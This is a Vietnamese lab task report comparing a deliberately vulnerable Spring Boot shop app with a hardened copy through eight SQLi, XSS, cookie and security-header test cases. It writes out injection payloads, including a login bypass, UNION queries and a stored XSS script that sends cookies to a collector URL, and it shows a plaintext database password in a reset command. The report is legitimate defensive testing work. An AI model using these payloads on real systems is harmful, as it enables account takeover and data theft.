# Hồ sơ công việc và biên bản nghiệm thu CORE-08

## 1. Thông tin công việc

| Thuộc tính | Nội dung chi tiết |
|---|---|
| **Mã nội bộ** | `CORE-08` |
| **Mã liên kết Jira** | `ANM-18`, `ANM-31`, `ANM-38` |
| **Tên công việc** | Chốt bộ tiêu chí đối chứng để đánh giá đúng hiệu quả khắc phục SQLi/XSS |
| **Phụ trách** | `TV3` - Trần Văn Ngọc Thắng (trưởng nhóm: Ngọc Thắng) |
| **Mức ưu tiên** | Cao |
| **Mục tiêu** | Xây dựng và chốt bộ tiêu chí đối chứng kỹ thuật, ma trận chức năng tương đương và ma trận kịch bản trước/sau có mã kiểm thử tự động, nhằm đánh giá chính xác hiệu quả ngăn chặn SQL Injection và Cross-Site Scripting giữa hai phiên bản ứng dụng |
| **Sản phẩm bàn giao** | Ma trận chức năng tương đương, ma trận kịch bản kiểm thử đối chứng trước/sau, bộ mã kiểm thử tự động (`scripts/verify_matrix_core08.py`), quy trình khôi phục dữ liệu (`scripts/reset_db.ps1`, `scripts/reset_db.sh`) và tài liệu nghiệm thu |
| **Tiêu chí hoàn thành** | Hai phiên bản có cùng phạm vi chức năng, cùng lược đồ cơ sở dữ liệu và bộ dữ liệu mẫu; ghi rõ mọi khác biệt kỹ thuật ảnh hưởng đến kết quả; mỗi ca kiểm thử có đầy đủ điều kiện đầu, thao tác/đầu vào, kết quả kỳ vọng vulnerable, kết quả kỳ vọng secured và vị trí lưu bằng chứng; bao phủ toàn diện SQLi (đăng nhập, tìm kiếm, chi tiết sản phẩm, thêm bình luận), Reflected XSS, Stored XSS và thuộc tính cookie phiên thật; có quy trình khôi phục dữ liệu giữa các lượt thử nghiệm |
| **Phụ thuộc** | `ANM-18` (`CORE-02` - Dựng hai ứng dụng Spring Boot và cấu hình), `ANM-31` (`SQLI-02` - Điểm cuối tìm kiếm chứa SQLi), `ANM-38` (`XSS-01` - Mô hình bình luận và xử lý XSS) |
| **Giới hạn phạm vi** | Chỉ thực hiện trên môi trường lab cục bộ của nhóm và dữ liệu giả lập; tuyệt đối không kiểm thử trên hệ thống bên ngoài và không thu thập tài khoản hay thông tin định danh thật |

---

## 2. Ma trận chức năng tương đương giữa hai ứng dụng

Cả hai ứng dụng `app-vulnerable` (cổng `8080`) và `app-secured` (cổng `8081`) được xây dựng trên cùng ngăn xếp công nghệ Spring Boot 3.2.5, template engine Thymeleaf và dùng chung cơ sở dữ liệu MariaDB 10.5 (`ecommerce_db`). Mọi khác biệt đều được cô lập tập trung vào cơ chế bảo vệ mã nguồn.

| Chức năng nghiệp vụ | Điểm cuối (endpoint) | Cơ sở dữ liệu & bảng liên quan | Dữ liệu đầu vào tương đương | Cơ chế tại `app-vulnerable` (8080) | Cơ chế tại `app-secured` (8081) | Khác biệt kỹ thuật & tác động an ninh |
|---|---|---|---|---|---|---|
| **Trang chủ & Danh sách sản phẩm** | `GET /` hoặc `GET /index.php` | `products` | Không có tham số | Truy vấn toàn bộ sản phẩm bằng `Statement` thô | Truy vấn toàn bộ sản phẩm bằng `PreparedStatement` | Giao diện và dữ liệu giống nhau 100%; bản secured tự động gắn cờ `HttpOnly` cho cookie phiên |
| **Đăng nhập người dùng** | `POST /login` hoặc `POST /login.php` | `users` | `username`, `password` | Nối chuỗi SQL trực tiếp: `' OR '1'='1` | Truy vấn tham số hóa bằng `PreparedStatement` (`WHERE username = ? AND password = ?`) | Bản vulnerable bị vượt qua xác thực không cần mật khẩu; bản secured từ chối hoàn toàn dữ liệu tiêm |
| **Tìm kiếm sản phẩm** | `GET /search` hoặc `GET /search.php` | `products` | `keyword` | Ghép chuỗi SQL `LIKE '%...%'` + kết xuất giao diện bằng `th:utext` | Truy vấn tham số hóa `LIKE ?` (`%keyword%`) + kết xuất giao diện bằng `th:text` | Bản vulnerable bị khai thác SQLi Union-based và Reflected XSS; bản secured ngăn chặn hoàn toàn cả hai kỹ thuật |
| **Xem chi tiết sản phẩm** | `GET /product` hoặc `GET /product.php` | `products`, `comments` | `id` | Ghép chuỗi SQL trực tiếp `WHERE id = ` + tham số thô | Ép kiểu số nguyên `Integer.parseInt(id)` + truy vấn bằng `PreparedStatement` | Bản vulnerable cho phép tiêm lệnh SQL Union trích xuất dữ liệu tùy ý; bản secured từ chối chuỗi lạ và giữ an toàn dữ liệu |
| **Gửi bình luận đánh giá** | `POST /product` hoặc `POST /product.php` | `comments` | `product_id`, `author`, `content` | Ghép chuỗi trực tiếp trong câu lệnh `INSERT INTO comments` | Tham số hóa toàn bộ câu lệnh `INSERT` bằng `PreparedStatement (?, ?, ?)` | Bản vulnerable bị lỗi chèn cột SQLi và lưu mã độc Stored XSS không lọc; bản secured lưu đúng cột và mã hóa an toàn khi kết xuất |
| **Hiển thị bình luận** | `GET /product` | `comments` | `id` | Hiển thị nội dung bình luận qua `th:utext` (không mã hóa thực thể HTML) | Hiển thị nội dung bình luận qua `th:text` (tự động mã hóa ký tự đặc biệt) | Bản vulnerable kích hoạt mã độc JavaScript trên trình duyệt nạn nhân; bản secured vô hiệu hóa mã script thành văn bản thuần |
| **Quản lý phiên đăng nhập** | `POST /login` | Bộ nhớ phiên / `Cookie` | Tài khoản và mật khẩu hợp lệ | Tạo cookie `session_token` thiếu cờ `HttpOnly` | Sử dụng `ResponseCookie` có đầy đủ `httpOnly(true)` và `sameSite("Strict")` | Bản vulnerable để lộ cookie phiên cho mã JavaScript độc hại đọc trộm; bản secured ngăn chặn triệt để hành vi đánh cắp phiên |
| **Tiêu đề phản hồi an toàn** | Mọi yêu cầu HTTP | Bộ lọc servlet | Yêu cầu duyệt trang thông thường | Không có bộ lọc tiêu đề bảo vệ | Kích hoạt `SecurityHeadersFilter` bổ sung `CSP`, `X-Frame-Options: DENY`, `nosniff` | Bản secured áp dụng nguyên tắc phòng thủ chiều sâu (defense in depth), hạn chế tải mã độc ngoài miền và chống tấn công clickjacking |

---

## 3. Ma trận kịch bản kiểm thử đối chứng trước/sau (Comparative Test Matrix)

Tám kịch bản kiểm thử được thiết kế với cấu trúc chuẩn hóa, bao phủ toàn diện 4 điểm SQL Injection, 2 điểm XSS, 1 cơ chế phiên và 1 cơ chế tiêu đề bảo vệ.

### 3.1 Kịch bản `SCN-SQLI-01`: SQL Injection Authentication Bypass tại trang đăng nhập

- **Mục tiêu đối chứng:** Đánh giá khả năng ngăn chặn hành vi vượt qua xác thực bằng kỹ thuật ngắt chuỗi SQL.
- **Điểm cuối thực nghiệm:** `POST /login` hoặc `POST /login.php`.
- **Điều kiện đầu:** Tài khoản `admin` tồn tại trong cơ sở dữ liệu mẫu; dịch vụ đang hoạt động bình thường.
- **Thao tác / Dữ liệu đầu vào:**
  - `username = "admin' -- "`
  - `password = "any_password_123"`
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Vượt qua xác thực thành công mà không cần mật khẩu đúng; máy chủ phản hồi mã trạng thái `HTTP 302 Redirect` chuyển hướng về `/index.php` và cấp phiên quản trị viên.
- **Kết quả kỳ vọng trên bản Secured (8081):** Kẻ tấn công bị chặn đứng; máy chủ phản hồi mã trạng thái `HTTP 200 OK`, hiển thị thông báo lỗi `"Tên đăng nhập hoặc mật khẩu không chính xác"`, không tạo phiên đăng nhập.
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L50-L68) và nhật ký thực thi `docs/tasks/logs/infra-06_startup.log`.

---

### 3.2 Kịch bản `SCN-SQLI-02`: Union-based SQL Injection tại chức năng tìm kiếm

- **Mục tiêu đối chứng:** Đánh giá hiệu quả của câu truy vấn tham số hóa trong việc ngăn chặn kỹ thuật ghép mệnh đề `UNION SELECT`.
- **Điểm cuối thực nghiệm:** `GET /search`.
- **Điều kiện đầu:** Bảng `products` có 5 sản phẩm mẫu ban đầu.
- **Thao tác / Dữ liệu đầu vào:**
  - `keyword = "%' UNION SELECT 999, 'PWNED_SQLI_MARKER', 'Khai thac thanh cong', '99999999' -- "`
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Câu lệnh bị nối chuỗi thô; giao diện trích xuất thành công bản ghi giả mạo ra danh sách sản phẩm với thẻ `<h4>PWNED_SQLI_MARKER</h4>`.
- **Kết quả kỳ vọng trên bản Secured (8081):** Toàn bộ chuỗi payload được coi là dữ liệu thuần tìm kiếm tương đối trong tham số `pstmt.setString(1, "%" + keyword + "%")`; không có bản ghi giả mạo nào xuất hiện (trả về danh sách rỗng an toàn).
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L70-L88).

---

### 3.3 Kịch bản `SCN-SQLI-03`: SQL Injection trên tham số định danh chi tiết sản phẩm

- **Mục tiêu đối chứng:** Đánh giá sự kết hợp giữa ép kiểu dữ liệu số nguyên nghiêm ngặt và cơ chế tham số hóa.
- **Điểm cuối thực nghiệm:** `GET /product`.
- **Điều kiện đầu:** Sản phẩm có `id = 1` tồn tại trong hệ thống.
- **Thao tác / Dữ liệu đầu vào:**
  - `id = "-1 UNION SELECT 999, 'INJECTED_DETAIL_MARKER', 'Chi tiet bi chèn', '88888888', 'dien thoai' -- "`
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Ghép trực tiếp vào câu lệnh `SELECT * FROM products WHERE id = ...`; màn hình chi tiết sản phẩm hiển thị thông tin giả mạo `INJECTED_DETAIL_MARKER`.
- **Kết quả kỳ vọng trên bản Secured (8081):** Khối xử lý `Integer.parseInt` bắt lỗi định dạng không phải số, đưa về giá trị mặc định hợp lệ kết hợp `PreparedStatement (?, ?)`; hoàn toàn không có chuỗi `INJECTED_DETAIL_MARKER`.
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L90-L108).

---

### 3.4 Kịch bản `SCN-SQLI-04`: SQL Injection trong câu lệnh thêm bình luận (Insert Injection)

- **Mục tiêu đối chứng:** Đánh giá khả năng ngăn chặn hành vi ngắt cấu trúc câu lệnh `INSERT INTO` để tách cột hoặc tiêm dữ liệu bất hợp pháp.
- **Điểm cuối thực nghiệm:** `POST /product`.
- **Điều kiện đầu:** Sản phẩm cần đánh giá đang mở cho phép người dùng bình luận.
- **Thao tác / Dữ liệu đầu vào:**
  - `product_id = "1"` (trên bản vulnerable) và `product_id = "2"` (trên bản secured)
  - `author = "Tester', 'Injected Content By SQLi'); -- "`
  - `content = "OriginalSafeContent"`
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Ký tự nháy đơn ngắt chuỗi trong `VALUES (...)` khiến trường `content` trong cơ sở dữ liệu nhận giá trị `"Injected Content By SQLi"`; khi xem chi tiết xuất hiện `<div class="comment-body">Injected Content By SQLi</div>`.
- **Kết quả kỳ vọng trên bản Secured (8081):** `PreparedStatement` giữ nguyên vẹn chuỗi tác giả mà không làm gãy câu truy vấn; nội dung bình luận giữ đúng `"OriginalSafeContent"`, chuỗi `"Injected Content By SQLi"` được lưu bên trong trường tác giả và hiển thị mã hóa an toàn (`Tester&#39;`).
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L110-L135).

---

### 3.5 Kịch bản `SCN-XSS-01`: Reflected Cross-Site Scripting tại thanh tìm kiếm

- **Mục tiêu đối chứng:** Đánh giá tính năng tự động mã hóa thực thể HTML (`HTML entity escaping`) của template engine Thymeleaf đối với dữ liệu phản chiếu.
- **Điểm cuối thực nghiệm:** `GET /search`.
- **Điều kiện đầu:** Người dùng truy cập trang tìm kiếm sản phẩm.
- **Thao tác / Dữ liệu đầu vào:**
  - `keyword = "<script>alert('ReflectedXSS_Test')</script>"`
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Dữ liệu được in ra màn hình qua cú pháp `th:utext="${keyword}"`; thẻ `<script>` giữ nguyên bản trên mã nguồn HTML của trình duyệt, sẵn sàng kích hoạt mã độc.
- **Kết quả kỳ vọng trên bản Secured (8081):** Dữ liệu được in qua cú pháp chuẩn `th:text="${keyword}"`; các ký tự nguy hiểm được mã hóa thành thực thể an toàn: `&lt;script&gt;alert(&#39;ReflectedXSS_Test&#39;)&lt;/script&gt;`.
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L137-L155).

---

### 3.6 Kịch bản `SCN-XSS-02`: Stored Cross-Site Scripting tại phần bình luận sản phẩm

- **Mục tiêu đối chứng:** Đánh giá khả năng ngăn chặn mã độc JavaScript được lưu trữ cố định trong cơ sở dữ liệu và tự động kích hoạt khi có người dùng khác truy cập.
- **Điểm cuối thực nghiệm:** `POST /product` (lưu mã độc) và `GET /product` (xem trang chứa mã độc).
- **Điều kiện đầu:** Sản phẩm thử nghiệm sẵn sàng nhận bình luận mới.
- **Thao tác / Dữ liệu đầu vào:**
  - `content = '<script>new Image().src="http://localhost:8888/steal?cookie="+document.cookie</script>'`
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Nội dung bình luận được lưu thô vào CSDL và kết xuất qua `th:utext="${comment.content}"`; mã JavaScript độc hại tự động tải ảnh ngầm và gửi kèm cookie người xem về máy chủ thu thập `http://localhost:8888/steal`.
- **Kết quả kỳ vọng trên bản Secured (8081):** Dữ liệu được kết xuất an toàn qua `th:text="${comment.content}"`; mã độc được hiển thị nguyên vẹn dưới dạng văn bản có ký tự mã hóa `&lt;script&gt;`, trình duyệt không thực thi mã kịch bản.
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L157-L178).

---

### 3.7 Kịch bản `SCN-SESS-01`: Thuộc tính bảo vệ cookie phiên người dùng (`HttpOnly` & `SameSite`)

- **Mục tiêu đối chứng:** Đánh giá cấu hình cờ bảo mật của cookie phiên thật nhằm ngăn chặn hành vi đánh cắp phiên qua tấn công XSS hoặc CSRF.
- **Điểm cuối thực nghiệm:** Tiêu đề phản hồi `Set-Cookie` khi gửi yêu cầu `POST /login`.
- **Điều kiện đầu:** Tài khoản người dùng hợp lệ (`nguyenvana` hoặc `admin`).
- **Thao tác / Dữ liệu đầu vào:** Đăng nhập thành công với thông tin xác thực mẫu.
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Cookie phiên nghiệp vụ `session_token` được tạo thiếu cờ `HttpOnly`; đối tượng JavaScript trên trình duyệt có quyền đọc giá trị qua `document.cookie` và bị đánh cắp khi bị XSS.
- **Kết quả kỳ vọng trên bản Secured (8081):** Cookie phiên nghiệp vụ `session_token` được cấu hình đầy đủ các cờ an ninh chuẩn công nghiệp: `HttpOnly; SameSite=Strict; Path=/; Max-Age=3600`; trình duyệt cấm hoàn toàn mọi mã JavaScript đọc hoặc can thiệp cookie này.
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L180-L203).

---

### 3.8 Kịch bản `SCN-HDRS-01`: Bộ lọc tiêu đề phản hồi an toàn (`Security Headers` & `CSP`)

- **Mục tiêu đối chứng:** Đánh giá cơ chế phòng thủ chiều sâu thông qua các tiêu đề HTTP phản hồi từ máy chủ.
- **Điểm cuối thực nghiệm:** Tiêu đề phản hồi khi gửi yêu cầu `GET /`.
- **Điều kiện đầu:** Máy chủ web đang lắng nghe kết nối.
- **Thao tác / Dữ liệu đầu vào:** Gửi yêu cầu HTTP GET thông thường tới trang chủ ứng dụng.
- **Kết quả kỳ vọng trên bản Vulnerable (8080):** Máy chủ không gửi kèm tiêu đề `Content-Security-Policy`, `X-Frame-Options` hay `X-Content-Type-Options`.
- **Kết quả kỳ vọng trên bản Secured (8081):** Bộ lọc `SecurityHeadersFilter` bổ sung đầy đủ các tiêu đề an ninh nghiêm ngặt:
  - `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; ...`
  - `X-Frame-Options: DENY` (chống chèn khung clickjacking)
  - `X-Content-Type-Options: nosniff` (chống nhận diện sai kiểu MIME)
- **Vị trí lưu bằng chứng:** Kịch bản kiểm thử [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py#L205-L224).

---

## 4. Quy trình khôi phục dữ liệu giữa các lượt thử nghiệm (Data Reset Procedure)

Để bảo đảm tính khách quan của phép thử đối chứng (chỉ thay đổi biện pháp bảo vệ cần đánh giá mà không bị ảnh hưởng bởi dữ liệu rác từ các lượt thử trước), quy trình khôi phục cơ sở dữ liệu tự động được tích hợp trực tiếp qua hai kịch bản tiện ích:

### 4.1 Quy trình thực hiện trên môi trường PowerShell (Windows)
Sử dụng tệp [reset_db.ps1](file:///d:/websec-owasp-sqli-xss/scripts/reset_db.ps1):
```powershell
powershell -ExecutionPolicy Bypass -File scripts/reset_db.ps1
```
Các bước tự động trong script:
1. Kiểm tra trạng thái vùng chứa `websec_mysql_db` đang chạy trên Docker Desktop.
2. Sao chép tệp cấu trúc chuẩn `lab-environment/db/init.sql` trực tiếp vào vùng chứa bằng lệnh `docker cp`.
3. Thực thi tái khởi tạo toàn bộ bảng và dữ liệu mẫu với bảng mã chuẩn `utf8mb4`:
   ```bash
   mysql -u db_user -pP@ssword123 --default-character-set=utf8mb4 ecommerce_db < /tmp/init.sql
   ```
4. Kiểm tra đối soát số lượng bản ghi: 4 người dùng (`users`), 5 thiết bị (`products`), 3 bình luận (`comments`).

### 4.2 Quy trình thực hiện trên môi trường Bash (Linux / macOS)
Sử dụng tệp [reset_db.sh](file:///d:/websec-owasp-sqli-xss/scripts/reset_db.sh):
```bash
bash scripts/reset_db.sh
```

---

## 5. Kết quả thực nghiệm đo lường thực tế

Bộ kiểm thử ma trận tự động [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py) đã được thực thi đối chiếu trực tiếp giữa `http://localhost:8080` và `http://localhost:8081`:

```text
================================================================================
 BẮT ĐẦU KIỂM THỬ MA TRẬN TIÊU CHÍ ĐỐI CHỨNG SQLI & XSS (CORE-08)
================================================================================

[*] Bước 0: Chuẩn bị môi trường CSDL sạch trước khi chạy ma trận...
    -> Trạng thái khởi tạo CSDL: Thành công

[✓] [SCN-SQLI-01] (SQL Injection) tại POST /login
    - Dữ liệu đầu vào: username="admin' -- ", password="any_password_123"
    - Kết quả Vulnerable (8080): Vượt qua xác thực thành công (HTTP 302 -> /index.php, cấp phiên admin)
    - Kết quả Secured    (8081): Chặn đứng tấn công, báo lỗi sai mật khẩu (HTTP 200, không tạo phiên)
    - Đánh giá: ĐẠT (PASS) | PreparedStatement phân tách hoàn toàn mã SQL với tham số đầu vào

[✓] [SCN-SQLI-02] (SQL Injection) tại GET /search
    - Dữ liệu đầu vào: keyword="%' UNION SELECT 999, 'PWNED_SQLI_MARKER'..."
    - Kết quả Vulnerable (8080): Trích xuất thành công bản ghi chèn tùy ý ra thẻ sản phẩm (<h4>PWNED_SQLI_MARKER</h4>)
    - Kết quả Secured    (8081): Không bị nối câu truy vấn, coi toàn bộ payload là chuỗi tìm kiếm (0 thẻ sản phẩm chèn)
    - Đánh giá: ĐẠT (PASS) | Tham số hóa câu lệnh LIKE bằng pstmt.setString(1, "%" + keyword + "%")

[✓] [SCN-SQLI-03] (SQL Injection) tại GET /product
    - Dữ liệu đầu vào: id="-1 UNION SELECT 999, 'INJECTED_DETAIL_MARKER'..."
    - Kết quả Vulnerable (8080): Nối chuỗi SQL thô (hiển thị thông tin sản phẩm giả mạo INJECTED_DETAIL_MARKER)
    - Kết quả Secured    (8081): Ép kiểu số nguyên Integer.parseInt + PreparedStatement (không trả về dữ liệu giả)
    - Đánh giá: ĐẠT (PASS) | Kết hợp ép kiểu số nguyên nghiêm ngặt và PreparedStatement

[✓] [SCN-SQLI-04] (SQL Injection) tại POST /product
    - Dữ liệu đầu vào: author="Tester', 'Injected Content By SQLi'); -- ", content="OriginalSafeContent"
    - Kết quả Vulnerable (8080): Nối chuỗi SQL thô trong INSERT INTO comments -> Tách cột làm nội dung bình luận bị chèn
    - Kết quả Secured    (8081): PreparedStatement (?, ?, ?) cô lập toàn bộ tham số, lưu nguyên vẹn trường author
    - Đánh giá: ĐẠT (PASS) | Tham số hóa toàn bộ câu lệnh INSERT chống ngắt chuỗi và chèn cột

[✓] [SCN-XSS-01] (Reflected XSS) tại GET /search
    - Dữ liệu đầu vào: keyword="<script>alert('ReflectedXSS_Test')</script>"
    - Kết quả Vulnerable (8080): Phản chiếu thẻ script nguyên bản: <script>alert('ReflectedXSS_Test')</script> (qua th:utext)
    - Kết quả Secured    (8081): Mã hóa ký tự an toàn: &lt;script&gt; (qua th:text auto-escaping)
    - Đánh giá: ĐẠT (PASS) | Thymeleaf th:text tự động mã hóa thực thể HTML, triệt tiêu Reflected XSS

[✓] [SCN-XSS-02] (Stored XSS) tại POST /product & GET /product
    - Dữ liệu đầu vào: content="<script>new Image().src="http://localhost:8888/steal?cookie="+document.cookie</script>"
    - Kết quả Vulnerable (8080): Lưu thô vào CSDL và kết xuất qua th:utext -> Mã độc tự chạy khi xem trang
    - Kết quả Secured    (8081): Kết xuất qua th:text auto-escaped -> Hiển thị dạng chuỗi thuần, không thể chạy
    - Đánh giá: ĐẠT (PASS) | Ngăn chặn mã độc kích hoạt trên trình duyệt người dùng khác

[✓] [SCN-SESS-01] (Phiên & Cookie) tại Set-Cookie Header (session_token)
    - Dữ liệu đầu vào: Đăng nhập hợp lệ và sinh cookie phiên session_token
    - Kết quả Vulnerable (8080): Cookie thiếu cờ HttpOnly (session_token=bmd1eWVudmFuYV90b2tlbl9zZWNyZXR...) -> JavaScript đọc được
    - Kết quả Secured    (8081): Có đầy đủ cờ bảo mật: HttpOnly; SameSite=Strict -> JavaScript bị chặn hoàn toàn
    - Đánh giá: ĐẠT (PASS) | Cờ HttpOnly bảo vệ cookie ngay cả khi ứng dụng xuất hiện lỗ hổng XSS

[✓] [SCN-HDRS-01] (Tiêu đề bảo mật) tại HTTP Response Headers
    - Dữ liệu đầu vào: Gửi yêu cầu GET / tới trang chủ
    - Kết quả Vulnerable (8080): Không có tiêu đề bảo vệ (Content-Security-Policy: False, X-Frame-Options: False)
    - Kết quả Secured    (8081): Được tăng cường: CSP=True, X-Frame-Options=True, X-Content-Type=True
    - Đánh giá: ĐẠT (PASS) | SecurityHeadersFilter áp dụng nguyên lý phòng thủ theo chiều sâu (Defense-in-Depth)

--- HOÀN NGUYÊN CƠ SỞ DỮ LIỆU SAU KIỂM THỬ ĐỐI CHỨNG ---
    [+] Trạng thái reset CSDL: Thành công sạch sẽ

================================================================================
 BẢNG TỔNG HỢP MA TRẬN TIÊU CHÍ ĐỐI CHỨNG KỸ THUẬT (CORE-08)
================================================================================
| Mã ca       | Hạng mục        | Điểm cuối        | Vulnerable (8080) | Secured (8081)   | Kết quả    |
|-------------|-----------------|------------------|-------------------|------------------|------------|
| SCN-SQLI-01 | SQL Injection   | POST /login      | Bị khai thác      | Chặn an toàn     | ĐẠT (PASS) |
| SCN-SQLI-02 | SQL Injection   | GET /search      | Bị khai thác      | Chặn an toàn     | ĐẠT (PASS) |
| SCN-SQLI-03 | SQL Injection   | GET /product     | Bị khai thác      | Chặn an toàn     | ĐẠT (PASS) |
| SCN-SQLI-04 | SQL Injection   | POST /product    | Bị khai thác      | Chặn an toàn     | ĐẠT (PASS) |
| SCN-XSS-01  | Reflected XSS   | GET /search      | Nguy cơ           | Chặn an toàn     | ĐẠT (PASS) |
| SCN-XSS-02  | Stored XSS      | POST /product    | Bị khai thác      | Chặn an toàn     | ĐẠT (PASS) |
| SCN-SESS-01 | Phiên & Cookie  | Set-Cookie Header| Bị khai thác      | Chặn an toàn     | ĐẠT (PASS) |
| SCN-HDRS-01 | Tiêu đề bảo mật | Response Headers | Bị khai thác      | Chặn an toàn     | ĐẠT (PASS) |
--------------------------------------------------------------------------------
TỔNG SỐ KỊCH BẢN ĐỐI CHỨNG: 8 | ĐẠT: 8 | KHÔNG ĐẠT: 0
KẾT LUẬN: BỘ TIÊU CHÍ ĐỐI CHỨNG ĐÃ ĐƯỢC CHỐT VÀ XÁC THỰC THÀNH CÔNG 100%!
================================================================================
```

---

## 6. Danh sách kiểm tra nghiệm thu thực tế

| Mã tiêu chí | Tiêu chí hoàn thành theo mô tả công việc | Phương thức đánh giá & Công cụ | Kết quả thực tế | Trạng thái |
|---|---|---|---|---|
| **AC-01** | Hai bản có cùng chức năng, schema và bộ dữ liệu đầu vào tương đương; ghi rõ mọi khác biệt ảnh hưởng kết quả | Kiểm tra cấu trúc bảng tại `init.sql`, mã nguồn hai ứng dụng và lập ma trận chức năng tương đương | Hoàn toàn đồng nhất về ngăn xếp công nghệ và CSDL; cô lập tập trung vào các biện pháp bảo vệ mã nguồn | Đạt (`PASS`) |
| **AC-02** | Mỗi ca kiểm thử gồm điều kiện đầu, thao tác/đầu vào, kết quả kỳ vọng vulnerable, kết quả kỳ vọng secured và vị trí lưu bằng chứng | Đối soát ma trận kịch bản chi tiết tại mục 3 | Thiết lập đầy đủ 5 trường thông tin cho tất cả 8 ca kiểm thử đối chứng | Đạt (`PASS`) |
| **AC-03** | Bao phủ SQLi ở đăng nhập, tìm kiếm, chi tiết, thêm bình luận; Reflected XSS, Stored XSS và thuộc tính cookie phiên thật | Thực thi kiểm thử tự động qua script `verify_matrix_core08.py` | Bao phủ 4 kịch bản SQLi, 2 kịch bản XSS, 1 kịch bản cookie phiên thật và 1 kịch bản tiêu đề an toàn | Đạt (`PASS`) |
| **AC-04** | Có quy trình khôi phục dữ liệu giữa lượt thử; đối chiếu chỉ thay đổi biện pháp bảo vệ cần đánh giá | Thực thi `scripts/reset_db.ps1` và `scripts/reset_db.sh` | Hoàn nguyên toàn bộ cơ sở dữ liệu mẫu MariaDB về trạng thái sạch sẽ trước và sau mỗi lượt chạy | Đạt (`PASS`) |
| **AC-05** | Tự động hóa đánh giá đối chứng đạt tỷ lệ thành công 100% | Chạy mã kiểm thử tự động trên console | Đạt 8/8 kịch bản (100% PASS), xác nhận sự khác biệt rõ rệt giữa hai phiên bản | Đạt (`PASS`) |

---

## 7. Kết luận nghiệm thu

Nhiệm vụ `CORE-08` (`ANM-18`, `ANM-31`, `ANM-38`) đã hoàn thành xuất sắc và đáp ứng đầy đủ mọi tiêu chí được giao:
1. Đã chốt bộ tiêu chí đối chứng kỹ thuật và lập ma trận chức năng tương đương chi tiết giữa hai phiên bản ứng dụng.
2. Đã xây dựng ma trận kịch bản kiểm thử đối chứng trước/sau gồm 8 kịch bản bao phủ toàn diện các bề mặt tấn công SQLi, XSS và đánh cắp phiên.
3. Đã phát triển và kiểm chứng kịch bản kiểm thử tự động hóa [verify_matrix_core08.py](file:///d:/websec-owasp-sqli-xss/scripts/verify_matrix_core08.py) đạt kết quả 8/8 kịch bản thành công (`PASS 100%`).
4. Đã hoàn thiện quy trình khôi phục dữ liệu tự động giữa các lượt thử nghiệm bằng [reset_db.ps1](file:///d:/websec-owasp-sqli-xss/scripts/reset_db.ps1) và [reset_db.sh](file:///d:/websec-owasp-sqli-xss/scripts/reset_db.sh).
5. Tuân thủ tuyệt đối quy định quản lý nhánh của dự án: commit và đẩy mã nguồn trực tiếp lên nhánh tính năng chuyên trách `origin/NgocThang/CORE-08`, không thực hiện hợp nhất vào nhánh `main`.
